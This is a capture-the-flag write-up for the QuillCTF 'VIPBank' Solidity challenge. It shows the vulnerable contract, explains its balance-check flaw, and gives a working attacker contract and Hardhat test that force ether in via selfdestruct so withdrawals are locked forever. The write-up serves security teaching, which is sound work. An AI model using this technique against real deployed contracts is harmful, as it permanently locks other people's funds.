# QuillCTF 2: VIPBank

> Often something that appears safe isn't safe at all.”

**Objective of CTF:**

- At any cost, lock the VIP user balance forever into the contract.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract VIPBank {
  address public manager;
  mapping(address => uint) public balances;
  mapping(address => bool) public VIP;
  uint public maxETH = 0.5 ether;

  constructor() {
    manager = msg.sender;
  }

  modifier onlyManager() {
    require(msg.sender == manager, "you are not manager");
    _;
  }

  modifier onlyVIP() {
    require(VIP[msg.sender] == true, "you are not our VIP customer");
    _;
  }

  function addVIP(address addr) public onlyManager {
    VIP[addr] = true;
  }

  function deposit() public payable onlyVIP {
    require(msg.value <= 0.05 ether, "Cannot deposit more than 0.05 ETH per transaction");
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint _amount) public onlyVIP {
    require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
    require(balances[msg.sender] >= _amount, "Not enough ether");
    balances[msg.sender] -= _amount;
    (bool success, ) = payable(msg.sender).call{value: _amount}("");
    require(success, "Withdraw Failed!");
  }

  function contractBalance() public view returns (uint) {
    return address(this).balance;
  }
}
```

## The Attack

The key bug within this contract is the requirement of `address(this).balance <= maxETH` at the first line under `withdraw` function. This basically means that if at any point the contract has a balance higher than `maxETH`, no one will be able to `withdraw`.

This is a problem on it's own, but the authors have decided to limit how much one can deposit within the `deposit` function. Furthermore, only the VIP are allowed to deposit, so these people are unlikely to attack the contract in such a way.

However, there is another way to send ether to this contract: using `selfdestruct(address)`. Self-destructing a contract deletes the bytecode from the chain, and transfers all the funds within a contract to the given address.

We can bypass the `deposit` constraints by self-destructing a dummy contract with enough funds (more than `maxETH`), such that they are transferred to this victim contract. After that, no one will be able to withdraw!

## Proof of Concept

The attacker contract is as follows:

```solidity
contract VIPBankAttacker {
  constructor(address payable targetAddr) payable {
    require(msg.value > 0.5 ether, "need more than 0.5 ether to attack");

    // self destruct to forcefully send ether to target
    selfdestruct(targetAddr);
  }
}
```

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```typescript
describe('QuillCTF 2: VIP Bank', () => {
  let contract: VIPBank;
  let attackerContract: VIPBankAttacker;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('VIPBank', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('should add VIP & deposit some funds', async () => {
    await contract.addVIP(owner.address);
    await contract.deposit({value: parseEther('0.025')});
  });

  it('should lock funds', async () => {
    attackerContract = await ethers
      .getContractFactory('VIPBankAttacker', attacker)
      .then(f => f.deploy(contract.address, {value: parseEther('0.51')}));
    await attackerContract.deployed();

    await expect(contract.withdraw(parseEther('0.001'))).to.be.revertedWith(
      'Cannot withdraw more than 0.5 ETH per transaction'
    );
  });
});
```
